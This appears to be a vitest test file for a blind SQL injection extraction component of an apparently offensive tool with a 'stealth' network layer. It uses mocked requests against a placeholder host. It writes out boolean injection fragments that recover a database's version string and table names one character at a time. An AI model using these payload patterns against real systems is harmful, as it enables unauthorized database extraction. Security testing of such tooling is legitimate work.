import { describe, it, expect, vi } from 'vitest';
import { BisectionExtractor } from './BisectionExtractor';
import { GhostNetwork } from '../stealth/GhostNetwork';
import { AdaptiveResponseOracle } from './AdaptiveResponseOracle';
import { StrategyContext } from './StrategyPlanner';

describe('BisectionExtractor with Adaptive Huffman Weighting', () => {
  const createMockOracle = (targetChar: string) => {
    const targetCode = targetChar.charCodeAt(0);
    const mockNetwork = {
      executeRequest: vi.fn().mockImplementation(async (req: any) => {
        const url = new URL(req.url);
        const payload = url.searchParams.get('q') || '';
        
        let conditionMet = false;
        // Check equality match
        const eqMatch = payload.match(/ASCII\(.+\)\s*=\s*(\d+)/);
        if (eqMatch) {
          conditionMet = targetCode === parseInt(eqMatch[1], 10);
        } else {
          // Check greater than match
          const gtMatch = payload.match(/ASCII\(.+\)\s*>\s*(\d+)/);
          if (gtMatch) {
            conditionMet = targetCode > parseInt(gtMatch[1], 10);
          }
        }

        return {
          status: 200,
          body: conditionMet ? 'VALID_PAGE_RESULT_TRUE' : 'INVALID_PAGE_RESULT_FALSE',
          headers: {},
        };
      }),
    } as unknown as GhostNetwork;

    const mockOracle = {
      isTrue: vi.fn().mockImplementation((res: any) => {
        return { isTrue: res.body.includes('VALID_PAGE_RESULT_TRUE'), confidence: 1.0 };
      }),
    } as unknown as AdaptiveResponseOracle;

    return { mockNetwork, mockOracle };
  };

  const dummyCtx: StrategyContext = {
    baseRequest: { url: 'https://api.target.com/search?q=test', method: 'GET', headers: {} },
    parameterName: 'q',
    originalValue: 'test',
  };

  it('correctly extracts high-frequency lowercase letters', async () => {
    const { mockNetwork, mockOracle } = createMockOracle('e');
    const bisector = new BisectionExtractor(mockNetwork, mockOracle);
    
    const extracted = await bisector.extractChar(dummyCtx, 'SUBSTRING(version(), 1, 1)', 'AND {TEST} --');
    expect(extracted).toBe('e');
    // Ensure request count is efficient (<= 7 queries)
    expect((mockNetwork.executeRequest as any).mock.calls.length).toBeLessThanOrEqual(7);
  });

  it('correctly extracts digits and symbols', async () => {
    const { mockNetwork, mockOracle } = createMockOracle('_');
    const bisector = new BisectionExtractor(mockNetwork, mockOracle);

    const extracted = await bisector.extractChar(dummyCtx, 'SUBSTRING(table_name, 1, 1)', 'AND {TEST} --');
    expect(extracted).toBe('_');
  });

  it('accelerates extraction with Markov bigram prediction', async () => {
    // After 'q', 'u' should be probed or rapidly isolated
    const { mockNetwork, mockOracle } = createMockOracle('u');
    const bisector = new BisectionExtractor(mockNetwork, mockOracle);

    const extracted = await bisector.extractChar(dummyCtx, 'SUBSTRING(val, 2, 1)', 'AND {TEST} --', 'q');
    expect(extracted).toBe('u');
    // Markov prior after 'q' directly probes 'u' = 117 in 1 request!
    expect((mockNetwork.executeRequest as any).mock.calls.length).toBe(1);
  });
});
